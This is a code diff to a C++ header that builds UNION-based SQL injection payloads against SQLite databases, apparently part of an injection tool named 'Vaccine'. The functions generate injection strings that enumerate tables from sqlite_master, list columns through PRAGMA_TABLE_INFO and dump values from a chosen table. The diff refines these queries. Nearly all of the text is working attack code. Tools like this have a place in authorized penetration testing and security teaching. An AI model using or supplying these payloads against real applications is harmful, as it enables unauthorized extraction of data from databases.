@@ -1,42 +1,37 @@
 #ifndef SQLITE_UNION_BASED
 #define SQLITE_UNION_BASED
 
-#define OFFSET 0
-#define TABLE 2
-#define COLUMN 3
-#define OFFSET_LEN 6
-
 #include "../../Vaccine.hpp"
+#include "../mysql/mysql.hpp"
 
 struct sqlite_union_based
 {
-        static std::string payload(sptr_vector& params, uint8 type)
+        static std::string payload(sptr_vector& config, uint8 type)
         {
                 std::string offset;
                 switch (type)
                 {
                 case TABLES:
-                        offset = *params[OFFSET];
-                        *params[OFFSET] += "null, ";
+                        offset = *config[UNION_BASED_OFFSET];
+                        *config[UNION_BASED_OFFSET] += "null, ";
                         return "' UNION SELECT " + offset + "name " +
-                               "FROM sqlite_master-- ";
+                               "FROM sqlite_master "
+                               "WHERE type='table'-- ";
                 case COLUMNS:
-                        if (params[OFFSET + 1] != NULL)
+                        if (config[UNION_BASED_OFFSET + 1] != NULL)
                         {
                                 for (uint8 i = 0; i < OFFSET_LEN; ++i)
-                                        params[OFFSET]->pop_back();
-                                params[OFFSET + 1] = NULL;
+                                        config[UNION_BASED_OFFSET]->pop_back();
+                                config[UNION_BASED_OFFSET + 1] = NULL;
                         }
                         return "' UNION SELECT " +
-                               *params[OFFSET] + "sql " +
-                               "FROM sqlite_master " +
-                               "WHERE type='table' " +
-                               "AND name='" +
-                               *params[TABLE + 1] + "'-- ";
+                               *config[UNION_BASED_OFFSET] + "name " +
+                               "FROM PRAGMA_TABLE_INFO('" +
+                               *config[UNION_BASED_TABLE + 1] + "')-- ";
                 case VALUES:
-                        return "' UNION SELECT " + *params[OFFSET] +
-                               *params[COLUMN] + " " +
-                               "FROM " + *params[TABLE] + "-- ";
+                        return "' UNION SELECT " + *config[UNION_BASED_OFFSET] +
+                               *config[UNION_BASED_COLUMN] + " " +
+                               "FROM " + *config[UNION_BASED_TABLE] + "-- ";
                 default:
                         return std::string();
                 }
